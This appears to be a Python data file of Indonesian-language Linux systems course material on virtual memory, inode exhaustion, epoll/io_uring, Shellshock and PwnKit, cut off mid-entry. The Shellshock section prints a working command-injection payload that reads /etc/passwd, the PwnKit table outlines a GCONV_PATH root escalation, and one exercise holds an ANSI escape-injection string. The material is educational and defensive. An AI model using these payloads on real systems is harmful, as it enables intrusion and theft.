# -*- coding: utf-8 -*-
"""
Authentic Remediation Data for Tier 07 Part 2 (Topics 118-124):
Virtual Memory, VFS & Storage, High-Speed I/O (epoll/io_uring), Advanced Shell,
Security Model & Capabilities, Observability (eBPF/perf), Containerization & Namespaces.
"""

DATA_TIER_07_PART2 = {
    118: {
        "trace": r"""#### Tabel Penelusuran Penjelajahan Tabel Halaman 4-Tingkat (4-Level Page Table Walk x86-64)
| Tingkat Penjelajahan Tabel | Register / Alamat Dasar | 9-Bit Indeks Offset Masukan | Alamat Fisik Entri Terbaca | Bit Kontrol Terverifikasi ($P, R/W, U/S$) | Status Transisi Penterjemahan |
|---|---|---|---|---|---|
| Alamat Virtual (CR2/Input) | `0x0000_7FFF_FFFF_4000` | Dekomposisi 48-bit Canonical | - | - | Awal penelusuran memori virtual |
| Level 4: PML4 | `CR3 = 0x0000_0001_A000` | Bit 47..39: `0x0FF` (255) | `PML4E = 0x0000_0002_B000` | $P=1$ (Present), $R/W=1, U/S=1$ | Lolos validasi level PML4 |
| Level 3: PDPT | `Alamat: 0x0000_0002_B000`| Bit 38..30: `0x1FF` (511) | `PDPTE = 0x0000_0003_C000` | $P=1, R/W=1, U/S=1$ | Lolos validasi direktori halaman |
| Level 2: Page Directory | `Alamat: 0x0000_0003_C000`| Bit 29..21: `0x1FF` (511) | `PDE = 0x0000_0004_D000` | $P=1, R/W=1, U/S=1$ | Lolos validasi tabel halaman |
| Level 1: Page Table | `Alamat: 0x0000_0004_D000`| Bit 20..12: `0x1F4` (500) | `PTE = 0x0000_0008_F000` | **Bit $P=0$ (NOT PRESENT!)** | **PAGE FAULT (#PF) DIPICU KE KERNEL!** |
| Penanganan Page Fault | Kernel `do_page_fault()` | Alokasi frame memori fisik baru | Buddy Allocator emisi 4 KiB | PTE diisi; Bit $P=1, A=1, D=0$ | Eksekusi diulang; TLB diperbarui |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Dampak Pemisahan Tabel Halaman KPTI (Kernel Page Table Isolation) terhadap Latensi I/O Global",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Menyusul pengungkapan kerentanan mikrokode Meltdown pada prosesor x86 pada awal 2018, para pengembang kernel Linux merilis patch darurat Kernel Page Table Isolation (KPTI) untuk mencegah proses pengguna membaca memori kernel secara spekulatif.
- **Akar Masalah Manajemen Memori Virtual & Flusing TLB**: Sebelum KPTI, alamat memori kernel dipetakan secara global di paruh atas ruang memori virtual setiap proses pengguna untuk memungkinkan transisi system call super cepat tanpa perlu menukar register tabel halaman `CR3`. Dengan KPTI diaktifkan, kernel dipaksa memisahkan tabel halaman menjadi dua: User Page Table dan Kernel Page Table. Setiap kali sebuah proses pengguna memanggil system call sekecil apapun (misal `read()` atau `write()`), CPU harus menukar nilai register `CR3`. Pergantian `CR3` secara otomatis membersihkan Translation Lookaside Buffer (TLB) CPU (*TLB Flush*). Akibatnya, server basis data dan sistem penyimpanan I/O tinggi mengalami lonjakan drastis dalam cache-miss terjemahan memori virtual, menyebabkan penurunan throughput transaksi hingga 30% di seluruh pusat data dunia.""",
            "snippet": r"""```c
// Rekonstruksi Pergantian Register CR3 pada Transisi KPTI (arch/x86/entry/calling.h)
.macro SWITCH_TO_KERNEL_CR3
    /* Baca alamat kernel page table dari per-cpu metadata */
    movq %cr3, %r11
    /* Bit 12 dibersihkan untuk menunjuk ke Kernel PML4 */
    andq $(~PTI_USER_PGTABLE_BIT), %r11
    movq %r11, %cr3
    /* KONSEKUENSI PERFORMA: Seluruh entri TLB non-global terhapus seketika! */
.endm

.macro SWITCH_TO_USER_CR3
    movq %cr3, %r11
    /* Bit 12 diaktifkan untuk menunjuk ke User PML4 (Hanya memuat stub trampoline) */
    orq $(PTI_USER_PGTABLE_BIT), %r11
    movq %r11, %cr3
.endm
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Krisis performa KPTI memicu lompatan besar dalam mikroarsitektur prosesor. Solusi perangkat keras berbasis *Process-Context Identifiers* (PCID / ASID) diadopsi, di mana setiap entri TLB diberi tag ID proses sehingga pertukaran register `CR3` tidak lagi memerlukan pengosongan (*flush*) seluruh memori cache terjemahan TLB, memulihkan performa sistem operasi mendekati batas teoritis aslinya."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun fungsi simulator penjelajahan tabel halaman 4-tingkat (*4-Level Page Table Walker*) dalam C/Python yang menerima alamat virtual 64-bit kanonikal, membedah 4 segmen offset indeks 9-bit (`PML4`, `PDPT`, `PD`, `PT`) serta offset halaman 12-bit, dan memetakan alamat fisik akhir menggunakan simulasi array memori.
- **Petunjuk Perancangan Arsitektur**:
  - Validasi canonical address: bit 48 sampai 63 harus merupakan replikasi dari bit 47 (sign extension).
  - Terapkan bitmask dan pergeseran bitwise: `(vaddr >> shift) & 0x1FF`.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Masukan Canonical*: `0x00007FFFF7B01000`; hitung indeks offset PML4, PDPT, PD, PT dan offset halaman `0x000`.
  - *Masukan Non-Canonical*: `0x0001000000000000`; parser harus menolak dan melempar exception canonical address fault.
- **Rubrik Penilaian Mandiri**: 40% Dekomposisi 4-Level Paging Bitwise Sesuai Arsitektur AMD64, 30% Validasi Canonical Address yang Ketat, 30% Kerapian Enkapsulasi Kode.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan implementasi *Buddy Memory Allocator* mandiri dalam C yang mengelola blok memori fisik sebesar 1 MiB dengan ukuran halaman minimum 4 KiB (ordo 0 hingga 8), lengkap dengan prosedur pemisahan blok (*block splitting*) saat alokasi dan penggabungan blok kembar (*buddy merging*) saat pembebasan memori.
- **Petunjuk Perancangan Arsitektur**:
  - Cari alamat kembaran (*buddy address*) menggunakan operasi bitwise XOR: `buddy_addr = block_addr ^ (1 << order_size)`.
  - Kelola blok bebas menggunakan array linked-list per ordo (*free list array*).
- **Test Vector & Kasus Uji Ekstrem**:
  - *Siklus Alokasi & Reklamasi*: Alokasikan 8 blok berukuran 4 KiB, bebaskan secara acak; buktikan seluruh blok kembar berhasil bergabung kembali menjadi blok tunggal 1 MiB tanpa fragmentasi eksternal residual.
- **Rubrik Penilaian Mandiri**: 40% Aritmatika Bitwise XOR Buddy Merging yang Benar, 30% Ketiadaan Fragmentasi Eksternal, 30% Efisiensi Free List O(1).

### Tingkat 3: Mahir
- **Tugas**: Rancang allocator objek memori kernel *SLUB Allocator* mini dalam C di atas Buddy Allocator yang mengelompokkan objek kecil berukuran tetap (misal: 64, 128, 256 byte) ke dalam halaman memori (*slab pages*) dengan pelacakan *freelist* tertanam di dalam objek itu sendiri (*intrusive freelist*) tanpa overhead metadata eksternal.
- **Petunjuk Perancangan Arsitektur**:
  - Objek bebas menampung pointer ke objek bebas berikutnya pada byte awal payload-nya.
  - Sediakan metode alokasi cepat `kmem_cache_alloc()` dan pembebasan `kmem_cache_free()` yang berjalan dalam $\mathcal{O}(1)$ konstan.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Benchmark Throughput*: Lakukan $1.000.000$ alokasi dan dealokasi objek 64-byte; buktikan overhead per operasi $< 15\text{ ns}$ dan efisiensi utilisasi memori mencapai $> 95\%$.
- **Rubrik Penilaian Mandiri**: 40% Implementasi Intrusive Freelist SLUB yang Presisi, 30% Manajemen Halaman Slab Dinamis, 30% Kinerja O(1) Terverifikasi."""
    },

    119: {
        "trace": r"""#### Tabel Penelusuran Siklus Alokasi Inode VFS & Kehabisan Inode Sistem Berkas Ext4
| Siklus Operasi I/O | Operasi VFS Kernel | Permintaan Alokasi Disk | Status Blok Data Fisik (GB) | Status Tabel Inode Fisik | Status Hasil Operasi Berkas |
|---|---|---|---|---|---|
| Awal Sistem Berkas | Pembuatan Ext4 Filesystem | Format 100 GB Disk | Bebas: 100 GB (100%) | Total Inode: 6.553.600 (Bebas: 100%) | Siap beroperasi |
| Pembuatan 6.5 Juta File | Loop membuat file 1-byte | Tulis 1 byte teks per file | Terpakai: 26 GB (Sisa: 74 GB BEBAS!)| Terpakai: 6.553.599 (Sisa: 1 Inode!) | Berkas tersimpan normal |
| Pembuatan File Baru | `creat("critical_log.txt")`| Minta alokasi 1 inode baru | Kapasitas disk masih sisa 74 GB! | **INODE TABLE PENUH (0 INODE BEBAS)** | **ENOSPC: No space left on device!**|
| Kebingungan Operator | `df -h` menunjukkan 74% Free | Operator mengira disk masih lega | Penulisan file basis data gagal | File log drop, transaksi terhenti | Bencana Downtime Produksi! |
| Mitigasi Diagnostik | `df -i` (Cek Inode) | Terlihat: `Use% = 100% Inodes` | - | Reformat dengan `-N` atau bersihkan file sampah | Pemahaman mendalam VFS memulihkan sistem |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Kelumpuhan Kluster Basis Data Produksi Akibat Kehabisan Inode Ext4 Meskipun Disk Masih Kosong 70%",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada platform analitik e-commerce global, seluruh kluster basis data utama mendadak menolak transaksi penulisan baru dan melempar error sistem operasi `ENOSPC: No space left on device`.
- **Akar Masalah Arsitektur Virtual Filesystem (VFS) & Tabel Inode Ext4**: Saat tim administrator memeriksa kapasitas disk menggunakan perintah standar `df -h`, disk menunjukkan bahwa kapasitas penyimpanan fisik masih tersisa lebih dari 500 GB (ruang bebas lebih dari 70%). Namun, tim tidak menyadari bahwa sistem berkas Linux berbasis Unix (seperti Ext4) memisahkan alokasi antara blok penyimpanan data fisik (*data blocks*) dan struktur metadata berkas (*inodes*). Jumlah inode ditentukan secara permanen pada saat sistem berkas diformat pertama kali. Sebuah mikroservis pelacak sesi pengguna secara keliru menuliskan jutaan file teks sementara berukuran 10 byte di dalam direktori `/tmp/sessions/`. Meskipun ukuran file sangat kecil, setiap file menghabiskan tepat 1 buah inode unik. Ketika 100% kuota tabel inode habis terpakai, sistem operasi menolak pembuatan berkas baru apapun di seluruh partisi penyimpanan, melumpuhkan seluruh transaksi basis data produksi.""",
            "snippet": r"""```c
// fs/ext4/ialloc.c - Mekanisme Alokasi Inode Baru pada Kernel Linux
struct inode *__ext4_new_inode(...) {
    struct ext4_group_desc *gdp;
    struct buffer_head *inode_bitmap_bh;
    
    // Cari grup blok yang masih memiliki alokasi inode bebas
    ino = ext4_find_next_zero_bit(inode_bitmap_bh->b_data, EXT4_INODES_PER_GROUP(sb), 0);
    
    // CACAT KAPASITAS: Jika seluruh bit pada seluruh grup bernilai 1 (Habis):
    if (ino >= EXT4_INODES_PER_GROUP(sb)) {
        // Melempar error 'No space left on device' meskipun sisa ratusan gigabyte block data!
        return ERR_PTR(-ENOSPC); 
    }
}
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden Inode Exhaustion menjadi acuan penting dalam rekayasa keandalan sistem (SRE). Tim pemantauan modern diwajibkan menyertakan metrik alarm inode (`node_filesystem_files_free`) bersamaan dengan metrik ruang disk (`node_filesystem_free_bytes`). Pada perancangan aplikasi berskala besar, penyimpanan jutaan objek kecil dialihkan ke basis data berorientasi objek (seperti RocksDB/BadgerDB) yang menggabungkan entitas ke dalam file log SST tunggal, mencegah pemborosan inode sistem berkas."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun program penjelajah metadata berkas (*Stat Inspector*) dalam C/Python yang menerima path berkas atau direktori, lalu membaca struktur data `struct stat` melalui system call `stat()` / `lstat()` untuk mencetak nomor Inode, jumlah Hard Links, ID Pemilik (UID/GID), Izin Akses Posix oktal, dan ukuran alokasi blok fisik (`st_blocks * 512 byte`) vs ukuran logika berkas (`st_size`).
- **Petunjuk Perancangan Arsitektur**:
  - Tangani kasus file sparse (*Sparse File*): buktikan bahwa ukuran fisik blok bisa jauh lebih kecil daripada ukuran logika berkas.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Berkas Hard Link*: Buat satu hard link baru ke berkas yang sama; pastikan kedua berkas memiliki nomor Inode yang identik persis dan `st_nlink` bertambah menjadi `2`.
- **Rubrik Penilaian Mandiri**: 40% Pembedahan Struktur stat yang Lengkap, 30% Pemahaman Inode dan Hard Link yang Tepat, 30% Kerapian Logging Output.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan implementasi VFS In-Memory File System sederhana (*RamFS*) dalam Python/C yang mendukung struktur pohon hierarkis direktori (`mkdir`), pembuatan berkas (`creat`), penulisan data (`write`), dan pembacaan (`read`) menggunakan pemisahan representasi *Dentry* (nama dan relasi hierarki) dan *Inode* (metadata dan pointer ke blok data).
- **Petunjuk Perancangan Arsitektur**:
  - Struktur Dentry memegang pointer ke Inode. Dua Dentry berbeda dapat menunjuk ke Inode yang sama untuk merepresentasikan hard link.
  - Sediakan operasi penghapusan berkas (`unlink`) yang hanya menghapus Inode saat pencacah referensi `nlink == 0`.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Hard Link Unlink*: Buat file `A`, buat hard link `B -> A`, hapus `A`; buktikan data masih dapat dibaca secara utuh melalui `B` dan memori fisik baru dibebaskan saat `B` dihapus.
- **Rubrik Penilaian Mandiri**: 40% Pemisahan Arsitektur Dentry vs Inode yang Bersih, 30% Manajemen Siklus Hidup Hard Link & Unlink, 30% Kerapian Struktur Data In-Memory.

### Tingkat 3: Mahir
- **Tugas**: Rancang sistem deteksi dan peringatan dini kehabisan Inode dan Blok Ruang Berkas terotomasi (*VFS Health Telemetry Daemon*) dalam Linux C/Go yang menggunakan system call `statvfs()` untuk memantau seluruh titik mount sistem berkas, menghitung laju pembakaran inode (*inode burn rate*), dan memicu tindakan mitigasi otomatis (pembersihan folder sementara) saat proyeksi sisa waktu $< 30\text{ menit}$.
- **Petunjuk Perancangan Arsitektur**:
  - Baca field `f_favail` (inode bebas) dan `f_files` (total inode) dari `struct statvfs`.
  - Terapkan estimasi regresi linier untuk menghitung turunan laju konsumsi inode per detik.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Simulasi Pembuatan File Massal*: Buat $10.000$ file per detik; buktikan daemon mendeteksi lonjakan burn-rate dalam $\le 2$ detik dan memicu peringatan kritis sebelum kuota inode mencapai 95%.
- **Rubrik Penilaian Mandiri**: 40% Penggunaan statvfs() untuk Telemetri Inode yang Akurat, 30% Algoritma Estimasi Burn-Rate Proaktif, 30% Tindakan Mitigasi Fail-Safe Otomatis."""
    },

    120: {
        "trace": r"""#### Tabel Penelusuran I/O Berkecepatan Tinggi: Dari `select()` $\mathcal{O}(N)$ ke `epoll` $\mathcal{O}(1)$ dan `io_uring` Zero-Syscall
| Arsitektur Model I/O | Operasi Pendaftaran Event | Mekanisme Notifikasi Kesiapan Socket | Kompleksitas Periksa Kesiapan | Overhead Ruang Memori per Loop | Konsekuensi Skalabilitas C10K / C1000K |
|---|---|---|---|---|---|
| Model Klasik `select()` | Salin bitmask `fd_set` dari User ke Kernel | Kernel memindai array linier seluruh FD | $\mathcal{O}(N)$ per loop | Menyalin ulang seluruh bitmap FD per panggilan | Kolaps total jika koneksi $> 1024$! |
| Model Menengah `poll()` | Salin array `struct pollfd` | Kernel memindai seluruh array linked list | $\mathcal{O}(N)$ per loop | Menyalin array ratusan ribu struct per panggilan | Boros CPU, throughput menurun drastis |
| Model Modern `epoll` | Daftar 1 kali via RB-Tree kernel (`epoll_ctl`) | Driver menyuntikkan event siap ke Ready List | $\mathcal{O}(1)$ instan via wait queue | Mengembalikan hanya socket yang aktif saja! | Mampu melayani 1.000.000 koneksi bersamaan |
| Kerentanan Epoll | Edge-Triggered vs Level-Triggered | Thundering herd pada multithread accept | - | Banyak thread bangun untuk 1 koneksi | Lonjakan CPU saat lonjakan koneksi tiba |
| Model Mutakhir `io_uring` | Ring Buffer bersama di shared memory | Submission Queue (SQ) & Completion Queue (CQ) | **NOL SYSTEM CALL!** | Zero-copy kernel space sharing | Throughput I/O maksimal mendekati batas PCIe SSD |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Runtuhnya Skalabilitas Server Web Skala Besar Akibat Masalah Epoll Thundering Herd (C10M Pitfall)",
            "chronology": r"""- **Kronologi & Konteks Kasus**: Pada server aplikasi perpesanan instan berskala jutaan koneksi (C10M Problem), tim infrastruktur mengonfigurasi arsitektur multi-proses di mana 32 proses pekerja (worker processes) secara bersama-sama mendengarkan pada satu file descriptor listening socket yang sama menggunakan mekanisme `epoll`.
- **Akar Masalah Model I/O Event-Driven & Thundering Herd**: Ketika satu koneksi klien baru tiba pada listening socket, implementasi epoll lawas kernel Linux membangunkan (*wake up*) seluruh 32 proses pekerja sekaligus dari tidur panggilan `epoll_wait()`. Tiga puluh dua proses pekerja berlomba-lomba memanggil `accept()` pada soket tersebut. Namun hanya tepat 1 proses yang berhasil menerima koneksi, sementara 31 proses pekerja lainnya gagal dengan kode galat `EAGAIN` atau `EWOULDBLOCK` dan kembali tertidur. Fenomena *Thundering Herd* ini memicu ribuan *context switch* sia-sia per detik, melumpuhkan efisiensi cache CPU, memicu lonjakan latensi jabat tangan koneksi hingga hitungan detik, dan menurunkan throughput server hingga lebih dari 60%.""",
            "snippet": r"""```c
// Rekonstruksi Masalah Thundering Herd pada Multi-Worker Epoll Server
#include <sys/epoll.h>
#include <sys/socket.h>
#include <unistd.h>

void worker_process_flawed(int listen_fd) {
    int epoll_fd = epoll_create1(0);
    struct epoll_event ev, events[10];
    
    // CACAT: Mendaftarkan listening socket tanpa flag EPOLLEXCLUSIVE
    ev.events = EPOLLIN; // Level-Triggered atau Edge-Triggered standar
    ev.data.fd = listen_fd;
    epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &ev);

    while (1) {
        // Ketika 1 koneksi baru tiba: SELURUH WORKER DIBANGUNKAN SERENTAK!
        int nfds = epoll_wait(epoll_fd, events, 10, -1);
        
        // 31 dari 32 proses pekerja akan gagal menerima koneksi:
        int client_fd = accept(listen_fd, NULL, NULL); 
        if (client_fd < 0) {
            // Membuang ribuan siklus CPU sia-sia dalam context switch massal!
        }
    }
}

// Mitigasi Defensif Modern: Flag EPOLLEXCLUSIVE (Kernel Linux 4.5+) atau SO_REUSEPORT
// ev.events = EPOLLIN | EPOLLEXCLUSIVE; // Hanya membangunkan tepat 1 worker!
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Masalah Thundering Herd mendorong inovasi besar pada subsistem jaringan Linux. Solusi industri modern meliputi: (1) Penegakan flag `EPOLLEXCLUSIVE` pada panggilan `epoll_ctl` yang menjamin kernel hanya membangunkan tepat satu proses pekerja saat ada koneksi baru; (2) Adopsi opsi socket `SO_REUSEPORT` yang memungkinkan setiap proses pekerja memiliki antrean pendengar independen dengan penyeimbangan beban (*load balancing*) terdistribusi secara langsung di dalam perangkat keras kernel."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun server TCP non-blocking berbasis *Echo Server* mandiri dalam C/Python menggunakan pemanggilan `epoll` (`epoll_create1`, `epoll_ctl`, `epoll_wait`) yang mampu melayani 100 klien simultan secara asynchronous dalam satu thread tunggal (*Single-Threaded Event Loop*).
- **Petunjuk Perancangan Arsitektur**:
  - Set seluruh socket klien ke mode non-blocking via `fcntl(fd, F_SETFL, O_NONBLOCK)`.
  - Tangani pembacaan parsial dan kode galat `EAGAIN` / `EWOULDBLOCK` secara elegan.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Uji Klien Simultan*: Hubungkan 50 koneksi klien serentak, kirim pesan acak; buktikan server membalas seluruh pesan dengan latency $< 1\text{ ms}$ tanpa thread terblokir.
- **Rubrik Penilaian Mandiri**: 40% Penggunaan epoll Event-Driven yang Tepat, 30% Penanganan Socket Non-Blocking Bebas Starvation, 30% Kerapian Enkapsulasi Event Loop.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan server web HTTP/1.1 minimalis berkinerja tinggi dalam C yang mengimplementasikan `epoll` dengan mode *Edge-Triggered* (`EPOLLET`), buktikan bahwa pembacaan data soket harus di-loop hingga tuntas (`read() == -1` dengan `errno == EAGAIN`) untuk mencegah pesan tertahan.
- **Petunjuk Perancangan Arsitektur**:
  - Pada mode Edge-Triggered, kernel hanya memberi sinyal satu kali saat data baru tiba.
  - Sediakan buffer melingkar per-koneksi untuk merangkai fragmen permintaan HTTP yang terpecah.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Serangan Slowloris Sederhana*: Kirim permintaan HTTP byte demi byte dengan jeda waktu; buktikan server mengumpulkan data secara parsial tanpa memblokir klien lain yang mengirim request lengkap.
- **Rubrik Penilaian Mandiri**: 40% Kepatuhan Semantik Edge-Triggered (EPOLLET), 30% Penanganan Fragmen Paket HTTP Parsial, 30% Ketahanan Terhadap Klien Lambat.

### Tingkat 3: Mahir
- **Tugas**: Rancang server transfer berkas berkecepatan ultra-tinggi dalam C/Linux yang memanfaatkan antarmuka mutakhir `io_uring` (`io_uring_queue_init`, `io_uring_get_sqe`, `io_uring_submit`) untuk membaca file dari disk dan mengirimkannya ke socket jaringan tanpa ada overhead system call di dalam hot-path loop utama.
- **Petunjuk Perancangan Arsitektur**:
  - Manfaatkan submission queue ring buffer dan completion queue ring buffer di memori bersama kernel-user.
  - Terapkan fitur *Fixed Buffers* dan *Polled I/O* (`IORING_SETUP_SQPOLL`) untuk eliminasi total context switch CPU.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Benchmark Throughput Jaringan*: Alirkan data file 10 GiB ke loopback socket; buktikan `io_uring` menghasilkan peningkatan throughput $\ge 25\%$ dibandingkan `epoll` standar dengan utilisasi CPU yang lebih rendah.
- **Rubrik Penilaian Mandiri**: 40% Arsitektur Ring Buffer io_uring SQ/CQ yang Presisi, 30% Eliminasi System Call dalam Hot-Path, 30% Pengukuran Throughput Komparatif Valid."""
    },

    121: {
        "trace": r"""#### Tabel Penelusuran Eksploitasi Injeksi Variabel Lingkungan Bash Shellshock (CVE-2014-6271)
| Tahap Eksekusi Bash | Variabel Lingkungan Masukan ($HTTP\_USER\_AGENT$) | State Parser Fungsi Bash | Evaluasi Definisi Fungsi | Aksi Eksekusi Ekstra Pasca Parsing | Konsekuensi Keamanan Sistem |
|---|---|---|---|---|---|
| 1. Masukan Klien | `() { :; }; /bin/cat /etc/passwd` | Inisialisasi proses child shell | Parser membaca string awalan `() {` | Dikenali sebagai definisi fungsi export | Target fungsi: `{ :; };` |
| 2. Parsing Selesai | Titik koma kedua tercapai | Penutupan blok fungsi sah | Parsing fungsi selesai | **PARSER TIDAK BERHENTI!** | Parser terus membaca sisa baris perintah! |
| 3. Eksekusi Liar | Perintah tambahan: `/bin/cat /etc/passwd` | Mode eksekusi langsung | Shell menjalankan sisa token sebagai perintah | Mengeksekusi biner beralamat root! | **REMOTE COMMAND INJECTION BERHASIL!**|
| 4. Eksfiltrasi | Output dikirim ke respon HTTP | File kredensial terbaca | - | Server membocorkan data rahasia | Server web CGI terinfeksi penuh |
| Mitigasi Patch | Penamaan Awalan Aman | Variabel fungsi diisolasi | Pemisahan parsing dan eksekusi | Perintah ekstra ditolak tegas | Pengecekan batas sintaks diperketat |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Eksploitasi Eksekusi Kode Jarak Jauh Bash Shellshock Melalui Variabel Lingkungan (CVE-2014-6271)",
            "chronology": r"""- **Kronologi & Konteks Sejarah**: Pada September 2014, Stéphane Chazelas menemukan kerentanan kritis berskala dahsyat pada GNU Bash (Bourne Again Shell) yang telah tertidur di dalam kode sumber Bash selama lebih dari 22 tahun (sejak versi 1.14 pada tahun 1992).
- **Akar Masalah Shell Scripting & Parsing Variabel Lingkungan**: Bash mendukung fitur mengekspor definisi fungsi ke sub-shell melalui variabel lingkungan: jika nilai variabel diawali dengan karakter `() {`, Bash akan menguraikannya sebagai definisi fungsi saat proses shell baru dimulai. Namun, parser fungsi Bash memiliki cacat mendasar: setelah selesai menguraikan penutupan tanda kurung kurawal fungsi `}`, parser tidak berhenti membaca; ia terus mengeksekusi instruksi shell apapun yang tertulis setelah definisi fungsi tersebut. Karena server web berbasis antarmuka Common Gateway Interface (CGI) secara otomatis memasukkan header HTTP klien (seperti `User-Agent`) ke dalam variabel lingkungan proses, seorang penyerang dapat mengeksekusi sembarang perintah sistem di server web dengan hak akses penuh hanya dengan mengirimkan satu baris HTTP request.""",
            "snippet": r"""```bash
# Rekonstruksi Uji Rentan Eksploitasi Shellshock (CVE-2014-6271)
# Header HTTP User-Agent yang dikirimkan penyerang ke web server CGI:
export HTTP_USER_AGENT='() { :; }; echo "VULNERABLE_PWNED"; /bin/cat /etc/passwd'

# Ketika server web mengeksekusi script bash CGI baru:
bash -c "echo Script Konten Web Normal"

# KELUARAN PADA BASH CACAT:
# Parser Bash mengeksekusi perintah injeksi terlebih dahulu sebelum script utama:
# VULNERABLE_PWNED
# root:x:0:0:root:/root:/bin/bash
# ...
# Script Konten Web Normal
```""",
            "analysis": r"""- **Analisis Forensik & Rekayasa Modern**: Insiden Shellshock mengubah paradigma keamanan *environment variables*. Standar rekayasa perangkat lunak modern kini melarang keras penerusan data pengguna eksternal yang tidak tervalidasi secara mentah ke dalam variabel lingkungan proses (*environment variable injection*). Pengembang kernel dan container kini menerapkan isolasi ketat yang membersihkan variabel lingkungan berbahaya sebelum memanggil shell eksternal."""
        },
        "exercise": r"""### Tingkat 1: Dasar
- **Tugas**: Bangun skrip pipeline shell Bash/Zsh defensif yang memproses file log akses web server sebesar $100\text{ MB}$, mengekstrak 10 alamat IP dengan tingkat kegagalan autentikasi terbanyak (status HTTP 401/403) menggunakan kombinasi `awk`, `sort`, dan `uniq -c`, dengan penerapan penanganan variabel kutip ganda defensif (*Strict Double-Quoting*) dan mode kesalahan ketat (`set -euo pipefail`).
- **Petunjuk Perancangan Arsitektur**:
  - `set -e`: Berhenti seketika saat ada perintah yang gagal.
  - `set -u`: Melempar error saat variabel belum dideklarasikan.
  - `set -o pipefail`: Gagalkan seluruh pipeline jika salah satu perintah di tengah gagal.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Data Uji*: Masukkan path file yang memuat karakter spasi dan karakter khusus (misal `/var/log/my test log (1).txt`); buktikan skrip berjalan tanpa error word splitting.
- **Rubrik Penilaian Mandiri**: 40% Penegakan Mode Defensif set -euo pipefail, 30% Penanganan Variabel Kutip Ganda Anti-Injection, 30% Presisi Analisis Awk Log.

### Tingkat 2: Menengah
- **Tugas**: Kembangkan alat CLI pengolah data JSON dan teks terstruktur dalam Python/Bash yang menggabungkan kemampuan `sed`, `awk`, dan `jq` untuk melakukan transformasi skema data berkas secara streaming baris-demi-baris tanpa memuat seluruh file ke dalam RAM.
- **Petunjuk Perancangan Arsitektur**:
  - Gunakan generator stream atau pipeline Unix FIFO (*Named Pipes* via `mkfifo`).
  - Lakukan validasi format JSON pada setiap record dan pisahkan record korup ke file penampung *dead-letter* terpisah.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Benchmark Memori*: Proses file JSONL sebesar 5 GiB pada mesin dengan RAM 512 MiB; buktikan utilisasi memori RSS proses tetap konstan $< 50\text{ MiB}$ sepanjang eksekusi.
- **Rubrik Penilaian Mandiri**: 40% Pemrosesan Data Streaming Berbasis Saluran Pipa, 30% Penanganan Dead-Letter Queue Rekor Korup, 30% Konsumsi Memori Konstan Terverifikasi.

### Tingkat 3: Mahir
- **Tugas**: Rancang mesin virtual emulator parser terminal mini (*VT100 / ANSI Escape Sequence Parser*) dalam C yang membaca stream byte karakter terminal mentah, mendeteksi dan menginterpretasikan urutan kode escape warna, pergerakan kursor, serta menghapus kode escape berbahaya (*ANSI Escape Injection Attacks*) sebelum mencetak teks ke layar.
- **Petunjuk Perancangan Arsitektur**:
  - Bangun State Machine FSM berbasis spesifikasi Paul Flo Williams VT500 State Diagram.
  - Filter urutan escape yang mencoba memanipulasi judul jendela (*OSC sequences*) atau mengeksploitasi fungsi paste bracket.
- **Test Vector & Kasus Uji Ekstrem**:
  - *Payload Injeksi Terminal*: Masukkan string eksploitasi ANSI escape sequence `\x1b[2J\x1b[H\x1b]0;Malicious Title\x07`; pastikan parser menetralisir perintah jahat dan hanya menyisakan teks konten bersih.
- **Rubrik Penilaian Mandiri**: 40% Implementasi Mesin FSM Parser ANSI VT100 Sesuai Standar, 30% Netralisasi Injeksi Escape Sequence Berbahaya, 30% Kerapian Enkapsulasi Kode."""
    },

    122: {
        "trace": r"""#### Tabel Penelusuran Eskalasi Hak Akses Lokal Polkit PwnKit (CVE-2021-4034)
| Langkah Eksekusi `pkexec` | Keadaan Parameter Argument (`argc`) | Pointer Argument (`argv[0]`) | Pointer Lingkungan (`envp[0]`) | Evaluasi Loop Baca Argumen | Status Hak Akses Sistemik |
|---|---|---|---|---|---|
| Pemanggilan Normal | `argc = 1` | `argv[0] = "pkexec"` | `envp[0] = "PATH=..."` | Baca argumen pertama normal | Root dengan otentikasi GUI |
| Eksploitasi PwnKit | `argc = 0` (Dibuat via `execve`) | `argv[0] = NULL` | `envp[0] = "pwned=./x"` | Loop: `for (n=1; n < argc; n++)` | `argc=0` dilewati |
| Out-of-Bounds Indexing | Evaluasi: `argv[1]` | Pointer melompati array kosong | Membaca memori berikutnya: `envp[0]`! | `argv[1]` diarahkan ke `envp[0]` | **OUT-OF-BOUNDS ARRAY READ!** |
| Manipulasi Lingkungan | Tulis ulang variabel lingkungan | Menimpa variabel `GCONV_PATH` | Mengarahkan glibc memuat pustaka shared jahat | Pustaka C memuat payload penyerang | Injeksi library eksternal sukses |
| Eksekusi SUID Root | Program memiliki bit SUID | Berjalan sebagai UID 0 (root) | Eksekusi pustaka dengan izin root | **SPAWN SHELL ROOT TANPA PASSWORD!** | Keamanan Linux jebol total! |""",
        "postmortem": {
            "title": "Studi Kasus Kegagalan Nyata: Eksploitasi Eskalasi Hak Akses Root Linux PwnKit pada Polkit pkexec (CVE-2021-4034)",
